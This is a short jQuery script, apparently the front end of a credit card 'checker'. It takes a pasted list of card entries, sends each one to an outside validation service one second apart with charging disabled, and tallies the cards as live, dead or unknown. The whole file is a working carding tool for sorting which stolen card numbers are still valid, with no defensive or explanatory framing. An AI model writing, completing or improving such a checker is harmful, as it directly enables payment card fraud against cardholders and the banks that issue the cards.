
let running = false;

$("#start-btn").click(function () {
  if (running) return;
  running = true;
  const lines = $("#cc-input").val().trim().split("\n");
  let index = 0;

  const next = () => {
    if (!running || index >= lines.length) return;
    const card = lines[index++].trim();
    if (!card) return next();

    $.post("https://api.chkr.cc/", { data: card, charge: false }, function (response) {
      try {
        const res = typeof response === "string" ? JSON.parse(response) : response;
        let msg = `[${res.code}] ${card} => ${res.status.toUpperCase()} - ${res.message}`;
        $("#output").append(msg + "\n");

        if (res.code === 0) $("#die-count").text(parseInt($("#die-count").text()) + 1);
        else if (res.code === 1) $("#live-count").text(parseInt($("#live-count").text()) + 1);
        else $("#unknown-count").text(parseInt($("#unknown-count").text()) + 1);
      } catch (e) {
        $("#output").append(`[X] ${card} => ERROR\n`);
      }
      setTimeout(next, 1000);
    }).fail(function () {
      $("#output").append(`[!] ${card} => Error al conectar\n`);
      setTimeout(next, 1000);
    });
  };

  next();
});

$("#stop-btn").click(function () {
  running = false;
});
